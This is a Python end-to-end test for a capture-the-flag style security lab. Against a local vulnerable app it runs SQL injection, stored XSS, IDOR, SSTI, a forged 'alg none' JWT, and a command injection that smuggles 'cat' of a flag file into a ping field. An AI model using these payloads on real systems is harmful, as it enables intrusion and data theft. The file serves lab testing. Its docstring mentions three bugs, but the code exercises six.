#!/usr/bin/env python
"""Standalone end-to-end match for the War Zone lab.

Boots the referee and the target against shared throwaway storage, exercises
all three bugs over HTTP exactly as the red-team agent would, submits each
captured flag to the referee, and checks the scoreboard and after-action
report. Runs without Docker so it can gate CI or a local change.
"""
from __future__ import annotations

import base64
import json
import os
import re
import subprocess
import sys
import tempfile
import time
from pathlib import Path

import requests

ROOT = Path(__file__).resolve().parents[1]
TARGET_DIR = ROOT / "services" / "target_app"
REFEREE_DIR = ROOT / "services" / "referee"
TARGET = "http://127.0.0.1:5000"
REFEREE = "http://127.0.0.1:9000"
FLAG_RE = re.compile(r"WARZONE\{[0-9a-f]+\}")


def _wait(url: str, deadline: float) -> None:
    while time.time() < deadline:
        try:
            if requests.get(f"{url}/healthz", timeout=1).status_code == 200:
                return
        except requests.RequestException:
            time.sleep(0.3)
    raise RuntimeError(f"{url} did not become healthy in time")


def _sqli_flag() -> str:
    resp = requests.post(f"{TARGET}/api/v1/auth/login",
                         json={"username": "admin' -- ", "password": "x"}, timeout=5)
    return resp.json()["flag"]


def _xss_flag() -> str:
    requests.post(f"{TARGET}/api/v1/comments",
                  json={"author": "mallory", "body": "<script>warzone-steal</script>"}, timeout=5)
    for _ in range(10):
        for c in requests.get(f"{TARGET}/api/v1/comments", timeout=5).json()["comments"]:
            if c["author"] == "admin-bot":
                m = FLAG_RE.search(c["body"])
                if m:
                    return m.group(0)
        time.sleep(1)
    raise RuntimeError("admin-bot never leaked the XSS flag")


def _idor_flag() -> str:
    resp = requests.get(f"{TARGET}/api/v1/users/1/profile", timeout=5)
    return resp.json()["flag"]


def _cmdi_flag(flag_path: Path) -> str:
    resp = requests.post(f"{TARGET}/api/v1/diagnostics/ping",
                         json={"host": f"127.0.0.1; cat {flag_path}"}, timeout=5)
    m = FLAG_RE.search(resp.json()["output"])
    if not m:
        raise RuntimeError("command injection did not return a flag")
    return m.group(0)


def _ssti_flag() -> str:
    resp = requests.post(f"{TARGET}/api/v1/render",
                         json={"template": "{{ config['FLAG'] }}"}, timeout=5)
    m = FLAG_RE.search(resp.json().get("rendered", ""))
    if not m:
        raise RuntimeError("SSTI did not render the flag")
    return m.group(0)


def _jwt_flag() -> str:
    def seg(obj: dict) -> str:
        return base64.urlsafe_b64encode(
            json.dumps(obj, separators=(",", ":")).encode()
        ).rstrip(b"=").decode()

    token = f"{seg({'alg': 'none', 'typ': 'JWT'})}.{seg({'username': 'admin'})}."
    return requests.post(f"{TARGET}/api/v1/account", json={"token": token}, timeout=5).json()["flag"]


def _spawn(module_dir: Path, env: dict) -> subprocess.Popen:
    return subprocess.Popen([sys.executable, "-m", "src.app"], cwd=module_dir, env=env,
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def main() -> int:
    tmp = Path(tempfile.mkdtemp(prefix="warzone-e2e-"))
    shared = {
        "STATE_DIR": str(tmp / "state"),
        "DASHBOARD_URL": "http://localhost:9",  # unreachable: forwarding no-ops
        "FLAG_ROTATE_SECONDS": "3600",
    }
    referee_env = {**os.environ, **shared, "TARGET_URL": TARGET, "LISTEN_HOST": "127.0.0.1"}
    target_env = {
        **os.environ, **shared,
        "DB_PATH": str(tmp / "target.db"),
        "FLAG_DIR": str(tmp / "flags"),
        "APP_LOG": str(tmp / "app.log"),
        "LISTEN_HOST": "127.0.0.1",
    }
    referee = _spawn(REFEREE_DIR, referee_env)
    target = _spawn(TARGET_DIR, target_env)
    try:
        _wait(REFEREE, time.time() + 15)
        _wait(TARGET, time.time() + 15)
        time.sleep(3)  # let the target mirror the referee's flag

        flag_path = tmp / "flags" / "flag_current.txt"
        checks = {"sqli": _sqli_flag(), "xss": _xss_flag(),
                  "cmdi": _cmdi_flag(flag_path), "idor": _idor_flag(),
                  "ssti": _ssti_flag(), "jwt": _jwt_flag()}

        for vector, flag in checks.items():
            verdict = requests.post(f"{REFEREE}/flags/submit",
                                    json={"flag": flag, "vector": vector}, timeout=5).json()
            assert verdict["status"] == "accepted", f"{vector}: {verdict}"
            print(f"  [{vector}] captured {flag} -> accepted ({verdict['points']} pts)")
            dup = requests.post(f"{REFEREE}/flags/submit",
                                json={"flag": flag, "vector": vector}, timeout=5).json()
            assert dup["status"] == "duplicate", f"{vector} should dedupe: {dup}"

        report = requests.get(f"{REFEREE}/report", timeout=5).json()
        assert report["scores"]["red"] > 0, report
        assert set(report["vectors_detected"]) == set(), "no blue in this smoke"
        captured = {c["vector"] for c in report["captures"]}
        assert {"sqli", "xss", "cmdi", "idor", "ssti", "jwt"} <= captured, captured
        print(f"e2e match: red scored {report['scores']['red']} across {sorted(captured)}")
        return 0
    finally:
        for proc in (target, referee):
            proc.terminate()
            proc.wait(timeout=5)


if __name__ == "__main__":
    sys.exit(main())
